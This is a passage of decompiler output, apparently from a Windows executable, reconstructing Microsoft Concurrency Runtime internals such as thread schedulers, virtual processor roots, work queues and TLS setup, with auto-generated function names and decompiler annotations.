  if ( result )
  {
    result = CloseHandle(*(HANDLE *)(this + 164));
    *(_DWORD *)(this + 164) = 0;
  }
  return result;
}

//----- (004410B5) --------------------------------------------------------
int __thiscall sub_4410B5(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 28))(this);
}

//----- (004410CD) --------------------------------------------------------
signed __int32 __thiscall sub_4410CD(int this)
{
  int v2; // ebx
  int v3; // eax
  signed __int32 v4; // eax
  signed __int32 result; // eax
  bool v6; // cf
  char pExceptionObject[12]; // [esp+4h] [ebp-10h] BYREF
  int v8; // [esp+10h] [ebp-4h]

  v8 = this;
  if ( (LPVOID)this == sub_4359BC() )
  {
    std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVcontext_self_unblock_Concurrency__);
  }
  v2 = *(_DWORD *)(this + 8);
  v3 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 28) + 4))(*(_DWORD *)(this + 28));
  sub_43914D(4, 4u, v3, v2);
  v4 = _InterlockedDecrement((volatile signed __int32 *)(v8 + 44));
  if ( !v4 )
    return SetEvent(*(HANDLE *)(v8 + 168));
  v6 = v4 == -1;
  result = v4 + 1;
  if ( !v6 && result != 1 )
  {
    std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVcontext_unblock_unbalanced_Concurrency__);
  }
  return result;
}
// 4899C4: using guessed type __TI_flags _TI2_AVcontext_self_unblock_Concurrency__;

//----- (00441155) --------------------------------------------------------
BOOL __thiscall sub_441155(int this)
{
  int v1; // ebx
  int v2; // eax

  v1 = *(_DWORD *)(this + 8);
  v2 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 28) + 4))(*(_DWORD *)(this + 28));
  sub_43914D(5, 4u, v2, v1);
  return SwitchToThread();
}

//----- (00441190) --------------------------------------------------------
_DWORD *__thiscall sub_441190(_DWORD *this, int a2)
{
  _DWORD *result; // eax

  sub_43DDE8(this, a2);
  *this = &Concurrency::details::ThreadInternalContext::`vftable';
  result = this;
  this[1] = &Concurrency::details::ThreadInternalContext::`vftable';
  return result;
}
// 47188C: using guessed type void *Concurrency::details::ThreadInternalContext::`vftable';
// 4718B4: using guessed type void *Concurrency::details::ThreadInternalContext::`vftable';

//----- (004411B6) --------------------------------------------------------
HANDLE *__thiscall sub_4411B6(HANDLE *this, const void **a2)
{
  HANDLE *result; // eax

  *this = &Concurrency::IScheduler::`vftable';
  sub_43480B(this + 2, a2);
  *this = &Concurrency::details::ThreadScheduler::`vftable';
  result = this;
  this[2] = &Concurrency::details::ThreadScheduler::`vftable';
  return result;
}
// 47186C: using guessed type void *Concurrency::IScheduler::`vftable';
// 471900: using guessed type void *Concurrency::details::ThreadScheduler::`vftable';
// 471920: using guessed type void *Concurrency::details::ThreadScheduler::`vftable';

//----- (004411E7) --------------------------------------------------------
void __thiscall sub_4411E7(char *this)
{
  char *v1; // ecx

  *(_DWORD *)this = &Concurrency::details::ThreadScheduler::`vftable';
  v1 = this + 8;
  *(_DWORD *)v1 = &Concurrency::details::ThreadScheduler::`vftable';
  sub_434CB4(v1);
}
// 471900: using guessed type void *Concurrency::details::ThreadScheduler::`vftable';
// 471920: using guessed type void *Concurrency::details::ThreadScheduler::`vftable';

//----- (004411FB) --------------------------------------------------------
_DWORD *__thiscall sub_4411FB(_DWORD *this, char a2)
{
  _DWORD *v2; // esi

  v2 = this - 1;
  *(this - 1) = &Concurrency::details::ThreadInternalContext::`vftable';
  *this = &Concurrency::details::ThreadInternalContext::`vftable';
  sub_43DECB(this - 1);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(v2);
  return v2;
}
// 47188C: using guessed type void *Concurrency::details::ThreadInternalContext::`vftable';
// 4718B4: using guessed type void *Concurrency::details::ThreadInternalContext::`vftable';

//----- (0044123D) --------------------------------------------------------
char *__thiscall sub_44123D(char *Block, char a2)
{
  sub_4411E7(Block);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}

//----- (00441262) --------------------------------------------------------
int __thiscall sub_441262(void *this, int a2, unsigned int a3)
{
  return sub_43520E((int)this + 8, a2, a3);
}

//----- (0044126E) --------------------------------------------------------
HANDLE *__cdecl sub_44126E(const void **a1)
{
  HANDLE *v1; // ecx
  HANDLE *result; // eax

  v1 = (HANDLE *)operator new(0x210u);
  result = 0;
  if ( v1 )
    return sub_4411B6(v1, a1);
  return result;
}

//----- (004412A1) --------------------------------------------------------
_DWORD *__fastcall sub_4412A1(int a1)
{
  _DWORD *v2; // edx
  _DWORD *result; // eax

  v2 = operator new(0xF0u);
  result = 0;
  if ( v2 )
    return sub_441190(v2, a1 != 8 ? a1 : 0);
  return result;
}

//----- (004412DF) --------------------------------------------------------
_DWORD *__stdcall sub_4412DF(int a1, int a2)
{
  _DWORD *v2; // ecx
  _DWORD *result; // eax

  v2 = operator new(0xE8u);
  result = 0;
  if ( v2 )
    return sub_443AF6(v2, a1, a2);
  return result;
}

//----- (00441317) --------------------------------------------------------
char *__thiscall sub_441317(char *this)
{
  return this - 8;
}

//----- (0044131B) --------------------------------------------------------
int __thiscall sub_44131B(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[2] + 4))(this + 2);
}

//----- (00441334) --------------------------------------------------------
_DWORD *__thiscall sub_441334(const void **this, _DWORD *a2)
{
  sub_436268(this + 2, a2);
  return a2;
}

//----- (00441349) --------------------------------------------------------
_DWORD *__thiscall sub_441349(const void **this, _DWORD *a2)
{
  return sub_441334(this - 2, a2);
}

//----- (00441351) --------------------------------------------------------
int __thiscall sub_441351(_DWORD *this, int a2, unsigned int a3)
{
  return sub_4376A8(this + 2, a2, a3);
}

//----- (0044135D) --------------------------------------------------------
union _SLIST_HEADER *__thiscall sub_44135D(union _SLIST_HEADER *this, _DWORD *a2, _DWORD *a3, union _SLIST_HEADER *a4)
{
  return sub_437A4D(this + 1, a2, a3, a4);
}

//----- (00441369) --------------------------------------------------------
DWORD sub_441369()
{
  DWORD result; // eax
  int LastError; // eax
  _DWORD pExceptionObject[4]; // [esp+0h] [ebp-10h] BYREF

  result = TlsAlloc();
  dwTlsIndex = result;
  if ( result == -1 )
  {
    LastError = GetLastError();
    if ( LastError > 0 )
      LastError = (unsigned __int16)LastError | 0x80070000;
    sub_43065D(pExceptionObject, LastError);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  return result;
}
// 441369: using guessed type _DWORD pExceptionObject[4];

//----- (004413AB) --------------------------------------------------------
BOOL sub_4413AB()
{
  BOOL result; // eax

  result = TlsFree(dwTlsIndex);
  dwTlsIndex = 0;
  return result;
}

//----- (004413D7) --------------------------------------------------------
void *__cdecl sub_4413D7(void *a1)
{
  __ExceptionPtrCreate(a1);
  __ExceptionPtrCurrentException(a1);
  return a1;
}

//----- (004413F1) --------------------------------------------------------
signed __int32 __thiscall sub_4413F1(volatile signed __int32 *this, int a2)
{
  volatile signed __int32 *v2; // esi
  signed __int32 v3; // edx
  signed __int32 v4; // ecx
  signed __int32 result; // eax

  v2 = this + 6;
  v3 = *((_DWORD *)this + 6);
  v4 = v3;
  for ( result = v3; ; v4 = result )
  {
    result = _InterlockedCompareExchange(v2, a2 | v4 & 0xFFFFFFFC, result);
    if ( result == v3 )
      break;
    v3 = result;
  }
  return result;
}

//----- (00441417) --------------------------------------------------------
int __thiscall sub_441417(_DWORD *this, unsigned int *a2)
{
  int result; // eax
  unsigned int v3; // ecx

  result = this[2];
  v3 = 0;
  if ( (result & 1) != 0 )
  {
    v3 = result & 0xFFFFFFFE;
    if ( (result & 0xFFFFFFFE) != 0 )
      result = *(_DWORD *)(v3 + 104);
    else
      result = 2;
  }
  if ( a2 )
    *a2 = v3;
  return result;
}

//----- (0044143F) --------------------------------------------------------
char __thiscall sub_44143F(volatile signed __int32 *this)
{
  signed __int32 v1; // edx
  signed __int32 v2; // eax

  v1 = *((_DWORD *)this + 6);
  if ( (v1 & 3) != 0 )
    return 0;
  while ( 1 )
  {
    v2 = _InterlockedCompareExchange(this + 6, v1 | 1, v1);
    if ( v2 == v1 )
      break;
    v1 = v2;
    if ( (v2 & 3) != 0 )
      return 0;
  }
  return 1;
}

//----- (00441467) --------------------------------------------------------
signed __int32 __thiscall sub_441467(volatile signed __int32 *this)
{
  volatile signed __int32 *v1; // edi
  signed __int32 i; // edx
  signed __int32 result; // eax
  signed __int32 v4; // eax
  void *v5; // eax
  unsigned int v6; // esi
  volatile signed __int32 v7; // edx
  volatile signed __int32 v8; // ecx

  v1 = this + 6;
  for ( i = *((_DWORD *)this + 6); ; i = v4 )
  {
    result = i & 0xFFFFFFFC;
    if ( (i & 0xFFFFFFFC) != 0 && result != 12 )
      break;
    v4 = _InterlockedCompareExchange(v1, i & 3 | 8, i);
    if ( v4 == i )
    {
      v5 = operator new(8u);
      v6 = (unsigned int)v5;
      if ( v5 )
        sub_4413D7(v5);
      else
        v6 = 0;
      v7 = *v1;
      v8 = *v1;
      for ( result = *v1; ; LOBYTE(v8) = result )
      {
        result = _InterlockedCompareExchange(v1, v6 | v8 & 3, result);
        if ( result == v7 )
          break;
        v7 = result;
      }
      return result;
    }
  }
  return result;
}

//----- (004414C5) --------------------------------------------------------
void __thiscall sub_4414C5(_DWORD *this)
{
  void *v2; // esi
  int v3; // ecx
  _DWORD v4[6]; // [esp-8h] [ebp-30h] BYREF
  char Block[20]; // [esp+10h] [ebp-18h] BYREF
  int v6; // [esp+24h] [ebp-4h]

  v2 = (void *)(this[6] & 0xFFFFFFFC);
  if ( v2 && v2 != (void *)12 )
  {
    __ExceptionPtrCopy(Block, (const void *)(this[6] & 0xFFFFFFFC));
    v6 = 0;
    __ExceptionPtrDestroy(v2);
    sub_42CF7C(v2);
    this[6] = 0;
    if ( !(unsigned __int8)__uncaught_exception() )
    {
      v4[1] = v3;
      v4[0] = v3;
      std::exception_ptr::exception_ptr((std::exception_ptr *)v4, (const struct std::exception_ptr *)Block);
      std::rethrow_exception();
    }
    __ExceptionPtrDestroy(Block);
  }
}
// 44151C: variable 'v3' is possibly undefined
// 44152C: using guessed type void __noreturn std::rethrow_exception(void);
// 44658E: using guessed type int __uncaught_exception(void);

//----- (00441546) --------------------------------------------------------
_DWORD *__thiscall sub_441546(_DWORD *this, int a2)
{
  int v3; // eax
  _DWORD *v4; // ecx
  int v5; // edx

  this[4] = a2;
  *this = 0;
  this[1] = 0;
  this[6] = 0;
  *((_BYTE *)this + 20) = 0;
  this[3] = 0;
  this[2] = 63;
  this[7] = unknown_libname_45(256);
  v3 = unknown_libname_45(512);
  if ( v3 )
  {
    v4 = (_DWORD *)v3;
    v5 = 64;
    do
    {
      *v4 = 0;
      v4 += 2;
      *(v4 - 1) = 0;
      --v5;
    }
    while ( v5 );
  }
  else
  {
    v3 = 0;
  }
  this[8] = v3;
  return this;
}
// 42D1CA: using guessed type int __cdecl unknown_libname_45(_DWORD);

//----- (004415B5) --------------------------------------------------------
_DWORD *__thiscall sub_4415B5(_DWORD *this)
{
  _DWORD *v2; // esi
  Concurrency::details::platform *v4; // [esp+0h] [ebp-20h]

  v2 = this + 28;
  sub_43C96D(this, (int)(this + 28));
  this[14] = 0;
  this[18] = 0;
  sub_441546(this + 19, (int)v2);
  *v2 = 0;
  this[11] = 0;
  this[13] = this;
  this[16] = Concurrency::details::platform::GetNextAsyncId(v4);
  return this;
}
// 4415EF: variable 'v4' is possibly undefined

//----- (004415FF) --------------------------------------------------------
int __thiscall sub_4415FF(int this, int a2)
{
  *(_DWORD *)(this + 60) = a2;
  return sub_436B3C(
           (int (__cdecl **)(int))(this + 28),
           (int (__cdecl *)(int))sub_441681,
           (int (__cdecl *)(int))this,
           *(_DWORD *)(*(_DWORD *)(a2 + 256) + 4));
}

//----- (00441623) --------------------------------------------------------
int __thiscall sub_441623(volatile __int32 *this)
{
  Concurrency::details::platform *v3; // [esp+0h] [ebp-8h]

  sub_4304D3(this + 28);
  *((_DWORD *)this + 16) = Concurrency::details::platform::GetNextAsyncId(v3);
  *this = 0;
  *((_DWORD *)this + 1) = 0;
  *((_DWORD *)this + 19) = 0;
  *((_DWORD *)this + 20) = 0;
  *((_DWORD *)this + 25) = 0;
  *((_BYTE *)this + 96) = 0;
  *((_DWORD *)this + 22) = 0;
  *((_DWORD *)this + 14) = 0;
  *((_DWORD *)this + 18) = 0;
  return sub_430514((_DWORD *)this + 28);
}
// 44162F: variable 'v3' is possibly undefined

//----- (0044165D) --------------------------------------------------------
int __thiscall sub_44165D(int this, int a2)
{
  *(_DWORD *)(this + 60) = a2;
  return sub_436B3C(
           (int (__cdecl **)(int))(this + 28),
           sub_441692,
           (int (__cdecl *)(int))this,
           *(_DWORD *)(*(_DWORD *)(a2 + 256) + 4));
}

//----- (00441681) --------------------------------------------------------
volatile signed __int32 *__cdecl sub_441681(int a1)
{
  return sub_44052D(*(_DWORD **)(a1 + 60), a1);
}

//----- (00441692) --------------------------------------------------------
signed __int32 __cdecl sub_441692(int a1)
{
  return sub_4406BF(*(union _SLIST_HEADER **)(a1 + 60), a1);
}

//----- (004416A3) --------------------------------------------------------
__int32 __thiscall sub_4416A3(volatile __int32 *this, char a2)
{
  _DWORD *v3; // esi
  __int32 v4; // edi

  v3 = this + 28;
  sub_4304D3(this + 28);
  v4 = sub_4418A2((int)this, a2);
  sub_430514(v3);
  return v4;
}

//----- (004416E6) --------------------------------------------------------
int __thiscall sub_4416E6(
        volatile __int32 *this,
        unsigned __int8 (__cdecl *a2)(int, int),
        int a3,
        int (__cdecl *a4)(int, int))
{
  volatile __int32 *v5; // eax
  __int32 v6; // edi
  __int32 v7; // esi
  int v8; // edx
  int v9; // eax
  char v10; // al
  volatile __int32 *v12; // [esp+10h] [ebp-1Ch]
  int v13; // [esp+18h] [ebp-14h]
  int v14; // [esp+1Ch] [ebp-10h]

  v12 = (volatile __int32 *)*((_DWORD *)this + 4);
  sub_4304D3(v12);
  v5 = this + 1;
  v6 = *((_DWORD *)this + 1);
  v7 = v6 - 1;
  if ( v6 - 1 >= *this )
  {
    v14 = *((_DWORD *)this + 1);
    v8 = v14;
    do
    {
      v9 = *(_DWORD *)(*((_DWORD *)this + 7) + 4 * (v7 & this[2]));
      v13 = v9;
      if ( v9 )
      {
        if ( a2(v9, a3) )
        {
          v10 = a4(v13, a3);
          v8 = v14;
          if ( v10 )
          {
            if ( v14 == v6 )
              --v6;
            else
              *(_DWORD *)(*((_DWORD *)this + 7) + 4 * (v7 & this[2])) = 0;
          }
        }
        else
        {
          v8 = v14;
        }
      }
      --v7;
      v14 = --v8;
    }
    while ( v7 >= *this );
    v5 = this + 1;
  }
  _InterlockedExchange(v5, v6);
  return sub_430514(v12);
}

//----- (0044179A) --------------------------------------------------------
int __thiscall sub_44179A(
        volatile __int32 *this,
        unsigned __int8 (__cdecl *a2)(int, int),
        int a3,
        int (__cdecl *a4)(int, int))
{
  return sub_4416E6(this + 19, a2, a3, a4);
}

//----- (004417A6) --------------------------------------------------------
__int32 __thiscall sub_4417A6(volatile __int32 *this, char a2, char *a3)
{
  __int32 v4; // ebx
  char v5; // cl

  v4 = 0;
  if ( sub_430528(this + 28) )
  {
    v4 = sub_4418A2((int)this, a2);
    sub_430514((_DWORD *)this + 28);
    v5 = 1;
  }
  else
  {
    v5 = 0;
  }
  *a3 = v5;
  return v4;
}

//----- (00441814) --------------------------------------------------------
__int32 __thiscall sub_441814(int this, char a2, int a3)
{
  int v4; // ecx
  __int32 v5; // ebx
  volatile __int32 v6; // edi

LABEL_11:
  v5 = 0;
  while ( 1 )
  {
    v6 = *(_DWORD *)this;
    _InterlockedExchange((volatile __int32 *)this, *(_DWORD *)this + 1);
    if ( v6 >= *(_DWORD *)(this + 4) )
    {
      *(_DWORD *)this = v6;
      return v5;
    }
    v4 = v6 & *(_DWORD *)(this + 8);
    if ( (*(_BYTE *)(*(_DWORD *)(this + 28) + 4 * v4) & 1) != 0
      && !a2
      && sub_43D9DD((_DWORD *)(*(_DWORD *)(this + 32) + 8 * v4)) )
    {
      break;
    }
    if ( *(_BYTE *)(this + 20) && *(_DWORD *)this >= *(_DWORD *)(this + 24) )
      *(_BYTE *)(this + 20) = 0;
    v5 = _InterlockedExchange((volatile __int32 *)(*(_DWORD *)(this + 28) + 4 * (v6 & *(_DWORD *)(this + 8))), 0);
    if ( v5 )
    {
      if ( (v5 & 1) == 0 )
        return v5;
      v5 &= ~1u;
      if ( sub_43875A((int *)(*(_DWORD *)(this + 32) + 8 * (v6 & *(_DWORD *)(this + 8))), 0) )
        return v5;
      goto LABEL_11;
    }
  }
  *(_DWORD *)this = v6;
  return 0;
}

//----- (004418A2) --------------------------------------------------------
__int32 __thiscall sub_4418A2(int this, char a2)
{
  __int32 result; // eax
  int *v4; // eax
  _BYTE *v5; // edi
  LPVOID v6; // eax
  int v7; // eax
  __int32 v8; // eax
  volatile signed __int32 *v9; // ecx

  if ( sub_440368((_DWORD *)this) )
    return 0;
  v4 = *(int **)(this + 72);
  v5 = 0;
  if ( v4 && v4[28] > 0 && !(*(unsigned __int8 (__thiscall **)(int *))(*v4 + 16))(v4) )
  {
    if ( !*(_BYTE *)(this + 96) || (v5 = (_BYTE *)sub_441814(this + 76, a2, 1)) == 0 )
    {
      v6 = sub_4359BC();
      if ( v6 )
        v7 = (int)v6 + 175;
      else
        v7 = 179;
      *(_BYTE *)v7 |= 2u;
      return (__int32)v5;
    }
    goto LABEL_17;
  }
  result = sub_43DBAF((int *)this, a2);
  if ( result )
    return result;
  v8 = sub_441814(this + 76, a2, 0);
  v5 = (_BYTE *)v8;
  if ( v8 )
  {
    v9 = *(volatile signed __int32 **)(this + 72);
    if ( !v9 || *(volatile signed __int32 **)(*(_DWORD *)(v8 + 8) + 12) != v9 )
    {
LABEL_17:
      sub_441A59(v5, 1);
      return (__int32)v5;
    }
    sub_438D6F(v9);
    sub_441A59(v5, 0);
  }
  return (__int32)v5;
}

//----- (0044195E) --------------------------------------------------------
void __cdecl sub_44195E(int a1)
{
  _InterlockedExchange((volatile __int32 *)(a1 + 116), 1);
  sub_4385C2(a1, -999);
  sub_438659(a1, 0);
}

//----- (00441985) --------------------------------------------------------
int __cdecl sub_441985(int (__thiscall ***a1)(_DWORD, int))
{
  return (**a1)(a1, 1);
}

//----- (004419A3) --------------------------------------------------------
void __thiscall sub_4419A3(_DWORD *this, int a2)
{
  if ( (signed __int32 (__cdecl *)(int))this[3] == sub_441A66 )
    sub_4419BB(this, a2);
  else
    sub_4419F1((int)this, a2);
}

//----- (004419BB) --------------------------------------------------------
void __thiscall sub_4419BB(_DWORD *this, int a2)
{
  int v2; // edx
  int v3; // eax
  volatile signed __int32 *v4; // ecx

  if ( !*(_DWORD *)(a2 != 0 ? a2 - 4 + 0x34 : 52) )
  {
    v3 = this[2];
    v4 = *(volatile signed __int32 **)(v3 + 12);
    *(_DWORD *)(a2 != 0 ? a2 - 4 + 0x34 : 52) = v3;
    *(_DWORD *)(a2 != 0 ? a2 - 4 + 0x38 : 56) = v3;
    v2 = a2 != 0 ? a2 - 4 : 0;
    sub_438535(v4, v2 != 0 ? v2 + 4 : 0, 0);
  }
}

//----- (004419F1) --------------------------------------------------------
void __thiscall sub_4419F1(int this, int a2)
{
  int v2; // edx
  int v3; // edi
  int v4; // ebx
  volatile signed __int32 *v5; // eax
  volatile signed __int32 *v6; // [esp+0h] [ebp-4h]

  v2 = a2 != 0 ? a2 - 4 : 0;
  if ( !*(_DWORD *)(v2 + 0x34) )
  {
    v3 = *(_DWORD *)(this + 8);
    v4 = v2 + 4;
    v5 = *(volatile signed __int32 **)(v3 + 12);
    *(_DWORD *)(a2 != 0 ? a2 - 4 + 0x34 : 52) = v3;
    *(_DWORD *)(a2 != 0 ? a2 - 4 + 0x38 : 56) = v3;
    v6 = v5;
    if ( *(_BYTE *)(this + 17) )
    {
      *(_BYTE *)(a2 != 0 ? a2 - 4 + 0x51 : 81) = 0;
      sub_43858E(v3 + 28, (_DWORD *)(v2 + 96));
    }
    else
    {
      sub_42E793((volatile signed __int32 *)(v3 + 32));
      ++*(_DWORD *)(v3 + 48);
      sub_42E8AD((volatile signed __int32 *)(v3 + 32));
      sub_438535(v6, v4, 1);
    }
  }
}

//----- (00441A59) --------------------------------------------------------
char __thiscall sub_441A59(_BYTE *this, char a2)
{
  char result; // al

  result = a2;
  this[17] = a2;
  return result;
}

//----- (00441A66) --------------------------------------------------------
signed __int32 __cdecl sub_441A66(int a1)
{
  char *v1; // eax
  char *v2; // ebx
  _DWORD *v3; // esi
  void *v4; // eax
  int v5; // ecx
  char pExceptionObject[12]; // [esp+10h] [ebp-38h] BYREF
  int v8; // [esp+1Ch] [ebp-2Ch]
  _DWORD *v9; // [esp+20h] [ebp-28h]
  char *v10; // [esp+24h] [ebp-24h]
  volatile signed __int32 *v11; // [esp+28h] [ebp-20h]
  void *v12; // [esp+2Ch] [ebp-1Ch]
  char *v13; // [esp+30h] [ebp-18h]
  _DWORD *v14; // [esp+34h] [ebp-14h]
  int v15; // [esp+44h] [ebp-4h]

  v1 = (char *)sub_4359BC();
  if ( v1 )
  {
    v2 = v1 - 4;
    v13 = v1 - 4;
  }
  else
  {
    v2 = 0;
    v13 = 0;
  }
  v10 = v2;
  v3 = *(_DWORD **)(a1 + 8);
  v14 = v3;
  v12 = (void *)v3[3];
  v9 = v2 + 4;
  sub_4419BB((_DWORD *)a1, v2 != 0 ? (unsigned int)(v2 + 4) : 0);
  v4 = (void *)sub_441417(v3, 0);
  v11 = 0;
  v8 = (int)v4;
  if ( v4 && v4 != (void *)2 )
    v11 = (volatile signed __int32 *)sub_439EAC(v4, (int)sub_44195E, v2 != 0 ? (unsigned int)(v2 + 4) : 0, 1);
  v15 = 0;
  if ( v3[6] )
  {
    std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AV_Interruption_exception_details_Concurrency__);
  }
  (*(void (__cdecl **)(int))(a1 + 4))(a1);
  v15 = -1;
  sub_438F6C(v12, v2 != 0 ? (unsigned int)v9 : 0);
  if ( v11 )
  {
    sub_439B0F(v8, (int)v11);
    sub_439F69(v11);
  }
  v5 = (int)v14;
  *((_DWORD *)v2 + 27) = -1;
  *((_DWORD *)v2 + 28) = -1;
  *((_DWORD *)v2 + 29) = 0;
  *((_DWORD *)v2 + 30) = 0;
  *((_DWORD *)v2 + 13) = 0;
  *((_DWORD *)v2 + 14) = 0;
  *(_DWORD *)(a1 + 8) = 0;
  return sub_439AE1(v5);
}

//----- (00441BB5) --------------------------------------------------------
_DWORD *__thiscall sub_441BB5(_DWORD *this, int a2, _DWORD *a3, int a4)
{
  _DWORD *result; // eax

  *this = &Concurrency::details::VirtualProcessorRoot::`vftable';
  this[1] = 0;
  sub_43A55E(this + 2, a2, a3, a4);
  *((_WORD *)this + 34) = 0;
  this[19] = 0;
  this[18] = _InterlockedIncrement(dword_492864);
  result = this;
  this[9] = this;
  return result;
}
// 471984: using guessed type void *Concurrency::details::VirtualProcessorRoot::`vftable';
// 492864: using guessed type signed __int32 dword_492864[19];

//----- (00441BFD) --------------------------------------------------------
_DWORD *__thiscall sub_441BFD(_DWORD *Block, char a2)
{
  *Block = &Concurrency::details::VirtualProcessorRoot::`vftable';
  Block[2] = &Concurrency::details::ExecutionResource::`vftable';
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}
// 4712D0: using guessed type void *Concurrency::details::ExecutionResource::`vftable';
// 471984: using guessed type void *Concurrency::details::VirtualProcessorRoot::`vftable';

//----- (00441C27) --------------------------------------------------------
int __thiscall sub_441C27(_DWORD *this)
{
  return sub_43A60A(this + 2);
}

//----- (00441C2F) --------------------------------------------------------
int __thiscall sub_441C2F(_DWORD *this)
{
  return this[13];
}

//----- (00441C33) --------------------------------------------------------
int __thiscall sub_441C33(_DWORD *this)
{
  return this[18];
}

//----- (00441C37) --------------------------------------------------------
int __thiscall sub_441C37(int *this, int a2)
{
  char pExceptionObject[12]; // [esp+4h] [ebp-Ch] BYREF

  if ( !a2 )
  {
    sub_429626((std::exception *)pExceptionObject, "pScheduler");
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  if ( *(_DWORD *)(this[7] + 8) != a2 )
  {
    std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVinvalid_operation_Concurrency__);
  }
  sub_441C8F((int)this);
  return sub_43B6AF(this[7], (int)this);
}
// 488F48: using guessed type __TI_flags _TI2_AVinvalid_operation_Concurrency__;

//----- (00441C8F) --------------------------------------------------------
unsigned int __thiscall sub_441C8F(int this)
{
  unsigned int result; // eax

  result = _InterlockedDecrement((volatile signed __int32 *)(this + 76));
  if ( !result )
    return sub_441CB2((_DWORD **)this);
  return result;
}

//----- (00441CA5) --------------------------------------------------------
unsigned __int32 __thiscall sub_441CA5(_DWORD **this)
{
  return sub_43BB1B(this[7], (int)(this + 2));
}

//----- (00441CB2) --------------------------------------------------------
unsigned int __thiscall sub_441CB2(_DWORD **this)
{
  return sub_43B538(this[7], (int)(this + 2));
}

//----- (00441CBF) --------------------------------------------------------
_DWORD *__thiscall sub_441CBF(_DWORD *this, int a2, _DWORD *a3, int a4)
{
  _DWORD *result; // eax

  sub_441BB5(this, a2, a3, a4);
  *this = &Concurrency::details::FreeVirtualProcessorRoot::`vftable';
  result = this;
  this[20] = 0;
  this[21] = 0;
  return result;
}
// 4719B0: using guessed type void *Concurrency::details::FreeVirtualProcessorRoot::`vftable';

//----- (00441CF2) --------------------------------------------------------
bool __thiscall sub_441CF2(_WORD *this, int a2)
{
  return *(_WORD *)(a2 + 4) == this[2] && *(_DWORD *)a2 == *(_DWORD *)this;
}

//----- (00441D12) --------------------------------------------------------
_DWORD *__thiscall sub_441D12(_DWORD *Block, char a2)
{
  *Block = &Concurrency::details::VirtualProcessorRoot::`vftable';
  Block[2] = &Concurrency::details::ExecutionResource::`vftable';
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}
// 4712D0: using guessed type void *Concurrency::details::ExecutionResource::`vftable';
// 471984: using guessed type void *Concurrency::details::VirtualProcessorRoot::`vftable';

//----- (00441D3C) --------------------------------------------------------
int __thiscall sub_441D3C(_DWORD *this)
{
  int result; // eax
  char v3[8]; // [esp+8h] [ebp-10h] BYREF
  int v4; // [esp+10h] [ebp-8h]
  void (*v5)(); // [esp+14h] [ebp-4h]

  v5 = sub_43051F;
  v4 = 0;
  while ( !this[1] )
    sub_42E8F5((int)v3);
  result = this[1];
  this[1] = 0;
  return result;
}
// 441D3C: using guessed type char var_10[8];

//----- (00441D6B) --------------------------------------------------------
int __thiscall sub_441D6B(int this, __int32 a2)
{
  __int32 v2; // edi
  int (__thiscall **v4)(void *); // esi
  int result; // eax
  char pExceptionObject[12]; // [esp+Ch] [ebp-Ch] BYREF

  v2 = a2;
  if ( !a2 )
  {
    sub_429626((std::exception *)pExceptionObject, "pContext");
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  v4 = (int (__thiscall **)(void *))(*(int (__thiscall **)(__int32))(*(_DWORD *)a2 + 8))(a2);
  if ( !v4 )
  {
    v2 = a2;
    v4 = (int (__thiscall **)(void *))(*(int (__thiscall **)(_DWORD, __int32))(**(_DWORD **)(this + 28) + 28))(
                                        *(_DWORD *)(this + 28),
                                        a2);
  }
  if ( _InterlockedIncrement((volatile signed __int32 *)(this + 76)) == 2 )
  {
    result = this + 4;
    _InterlockedExchange((volatile __int32 *)(this + 4), v2);
  }
  else
  {
    sub_44207B((_DWORD *)this);
    if ( *(_DWORD *)(this + 80) )
    {
      if ( v4 != *(int (__thiscall ***)(void *))(this + 80) )
      {
        std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
        _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVinvalid_operation_Concurrency__);
      }
    }
    *(_DWORD *)(this + 84) = 0;
    sub_441CA5((_DWORD **)this);
    sub_441E2A((int (__thiscall ***)(void *))this, v4);
    return sub_44241E((HANDLE *)v4);
  }
  return result;
}
// 488F48: using guessed type __TI_flags _TI2_AVinvalid_operation_Concurrency__;

//----- (00441E2A) --------------------------------------------------------
int __thiscall sub_441E2A(int (__thiscall ***this)(void *), int (__thiscall **a2)(void *))
{
  int (__thiscall **v3)(void *); // ebx
  int v4; // eax

  sub_442440(a2);
  this[20] = a2;
  a2[4] = (int (__thiscall *)(void *))this;
  v3 = this[7];
  v4 = (**this)(this);
  return sub_442045((int)a2, *((_DWORD *)v3[4] + 13 * v4), *((_WORD *)v3[4] + 26 * v4 + 6), 0);
}

//----- (00441E91) --------------------------------------------------------
char __thiscall sub_441E91(int this, int a2)
{
  int v3; // esi
  char pExceptionObject[16]; // [esp+Ch] [ebp-10h] BYREF

  if ( !a2 )
  {
    sub_429626((std::exception *)pExceptionObject, "pContext");
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  if ( !*(_DWORD *)(this + 80)
    || (v3 = (*(int (__thiscall **)(int))(*(_DWORD *)a2 + 8))(a2), *(_DWORD *)(this + 80) != v3) )
  {
    std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVinvalid_operation_Concurrency__);
  }
  if ( _InterlockedDecrement((volatile signed __int32 *)(this + 76)) )
  {
